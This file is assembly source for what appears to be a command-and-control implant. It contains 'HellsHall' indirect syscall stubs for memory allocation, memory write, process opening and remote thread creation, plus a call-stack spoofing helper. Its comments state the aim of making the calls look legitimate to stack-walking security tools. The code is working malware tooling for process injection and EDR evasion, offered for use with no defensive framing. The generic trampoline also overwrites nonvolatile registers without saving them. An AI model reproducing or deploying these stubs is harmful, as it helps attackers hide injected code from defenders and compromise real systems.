; HellsHall indirect syscall stubs.
;
; Three minimal wrappers (NtAllocateVirtualMemory_i, NtProtectVirtualMemory_i,
; NtFreeVirtualMemory_i) have NO prologue — they simply load the pre-computed
; SSN and the ntdll "syscall; ret" gadget address, execute `mov r10, rcx` (NT
; ABI requirement), and JMP to the gadget.
;
; Because we JMP rather than CALL into ntdll, the return address on the kernel's
; visible call stack belongs to the caller of our wrapper, and the gadget address
; itself is inside ntdll — so a stack walker sees:
;   caller_of_wrapper → ntdll!Nt* + offset     (looks like a legitimate syscall)
;
; co2h_do_syscall is the generic trampoline for future postex commands; it calls
; co2h_syscall_ssn / co2h_syscall_gadget from syscalls.c and shifts args.
; co2h_call_spoofed is the call-stack spoofing helper.

_TEXT SEGMENT

; ---- Globals from syscalls.c -----------------------------------------------
EXTERN g_ssn_NtAllocateVirtualMemory : DWORD
EXTERN g_ssn_NtProtectVirtualMemory  : DWORD
EXTERN g_ssn_NtFreeVirtualMemory     : DWORD
EXTERN g_ssn_NtOpenProcess           : DWORD
EXTERN g_ssn_NtWriteVirtualMemory    : DWORD
EXTERN g_ssn_NtReadVirtualMemory     : DWORD
EXTERN g_ssn_NtCreateThreadEx        : DWORD
EXTERN g_hh_gadget                   : QWORD

; ---- Generic SSN / gadget resolvers (used by co2h_do_syscall) --------------
EXTERN co2h_syscall_ssn    : PROC
EXTERN co2h_syscall_gadget : PROC

; ===========================================================================
; NtAllocateVirtualMemory_i
;   NTSTATUS (HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG)
;   rcx, rdx, r8, r9, [rsp+28h], [rsp+30h]
; ===========================================================================
PUBLIC NtAllocateVirtualMemory_i
NtAllocateVirtualMemory_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtAllocateVirtualMemory]
    mov     r10, rcx
    jmp     r11
NtAllocateVirtualMemory_i ENDP

; ===========================================================================
; NtProtectVirtualMemory_i
;   NTSTATUS (HANDLE, PVOID*, PSIZE_T, ULONG, PULONG)
;   rcx, rdx, r8, r9, [rsp+28h]
; ===========================================================================
PUBLIC NtProtectVirtualMemory_i
NtProtectVirtualMemory_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtProtectVirtualMemory]
    mov     r10, rcx
    jmp     r11
NtProtectVirtualMemory_i ENDP

; ===========================================================================
; NtFreeVirtualMemory_i
;   NTSTATUS (HANDLE, PVOID*, PSIZE_T, ULONG)
;   rcx, rdx, r8, r9
; ===========================================================================
PUBLIC NtFreeVirtualMemory_i
NtFreeVirtualMemory_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtFreeVirtualMemory]
    mov     r10, rcx
    jmp     r11
NtFreeVirtualMemory_i ENDP

; ===========================================================================
; NtOpenProcess_i
;   NTSTATUS (PHANDLE, ACCESS_MASK, PVOID, PVOID)
;   rcx, rdx, r8, r9
; ===========================================================================
PUBLIC NtOpenProcess_i
NtOpenProcess_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtOpenProcess]
    mov     r10, rcx
    jmp     r11
NtOpenProcess_i ENDP

; ===========================================================================
; NtWriteVirtualMemory_i
;   NTSTATUS (HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T)
;   rcx, rdx, r8, r9, [rsp+28h]
; ===========================================================================
PUBLIC NtWriteVirtualMemory_i
NtWriteVirtualMemory_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtWriteVirtualMemory]
    mov     r10, rcx
    jmp     r11
NtWriteVirtualMemory_i ENDP

; ===========================================================================
; NtReadVirtualMemory_i
;   NTSTATUS (HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T)
;   rcx, rdx, r8, r9, [rsp+28h]
; ===========================================================================
PUBLIC NtReadVirtualMemory_i
NtReadVirtualMemory_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtReadVirtualMemory]
    mov     r10, rcx
    jmp     r11
NtReadVirtualMemory_i ENDP

; ===========================================================================
; NtCreateThreadEx_i
;   NTSTATUS (PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID start, PVOID arg,
;             ULONG flags, SIZE_T, SIZE_T, SIZE_T, PVOID)  — 11 args
;   rcx, rdx, r8, r9, [rsp+28h..58h]
; All stack args are placed by the caller's CALL; JMP passes them through.
; ===========================================================================
PUBLIC NtCreateThreadEx_i
NtCreateThreadEx_i PROC
    mov     r11, QWORD PTR [g_hh_gadget]
    mov     eax, DWORD PTR [g_ssn_NtCreateThreadEx]
    mov     r10, rcx
    jmp     r11
NtCreateThreadEx_i ENDP

; ===========================================================================
; co2h_do_syscall — generic trampoline for up to 4 + 1 stack args.
;
; Signature (C):  int64_t co2h_do_syscall(uint32_t fn_hash, a1, a2, a3, a4);
;
; Steps:
;   1. Stash fn_hash and the four arg registers in shadow space.
;   2. Call co2h_syscall_ssn(fn_hash) → SSN into r12.
;   3. Call co2h_syscall_gadget(fn_hash) → gadget into r13.
;   4. Restore args shifted left one slot (rdx→rcx, r8→rdx, r9→r8,
;      original 5th stack arg → r9).
;   5. leave; mov eax, r12d; mov r10, rcx; jmp r13.
; ===========================================================================
PUBLIC co2h_do_syscall
co2h_do_syscall PROC
    push    rbp
    mov     rbp, rsp
    sub     rsp, 40h

    mov     [rbp - 08h], rcx    ; fn_hash
    mov     [rbp - 10h], rdx    ; real arg1
    mov     [rbp - 18h], r8     ; real arg2
    mov     [rbp - 20h], r9     ; real arg3

    ; Resolve SSN.
    mov     rcx, [rbp - 08h]
    call    co2h_syscall_ssn
    mov     r12d, eax           ; r12 = ssn

    ; Resolve gadget.
    mov     rcx, [rbp - 08h]
    call    co2h_syscall_gadget
    mov     r13, rax            ; r13 = gadget ptr

    ; Restore args shifted left.
    mov     rcx, [rbp - 10h]
    mov     rdx, [rbp - 18h]
    mov     r8,  [rbp - 20h]
    mov     r9,  [rbp + 30h]    ; original 5th arg from caller stack

    leave

    mov     eax, r12d
    mov     r10, rcx
    jmp     r13
co2h_do_syscall ENDP

; ===========================================================================
; co2h_call_spoofed — call fn(a1,a2,a3,a4) with fake return address.
;
; uint64_t co2h_call_spoofed(void* fn, void* fake_ret,
;                            uint64_t a1, uint64_t a2,
;                            uint64_t a3, uint64_t a4);
;
; Overwrites this frame's return slot with fake_ret before calling fn,
; restores the real return afterward.  A stack walker during fn sees:
;   fn → co2h_call_spoofed → fake_ret → ...
; ===========================================================================
PUBLIC co2h_call_spoofed
co2h_call_spoofed PROC
    push    rbp
    mov     rbp, rsp
    push    r12
    push    r13
    push    r14
    sub     rsp, 28h            ; shadow space + alignment

    mov     r12, [rbp + 8]      ; real return address
    mov     r13, rdx            ; fake_ret
    mov     r14, rcx            ; fn

    ; Shift: a1→rcx, a2→rdx, a3→r8, a4→r9
    mov     rcx, r8
    mov     rdx, r9
    mov     r8,  [rbp + 30h]    ; a3
    mov     r9,  [rbp + 38h]    ; a4

    mov     [rbp + 8], r13      ; overwrite return slot
    call    r14
    mov     [rbp + 8], r12      ; restore real return

    add     rsp, 28h
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    ret
co2h_call_spoofed ENDP

_TEXT ENDS
END
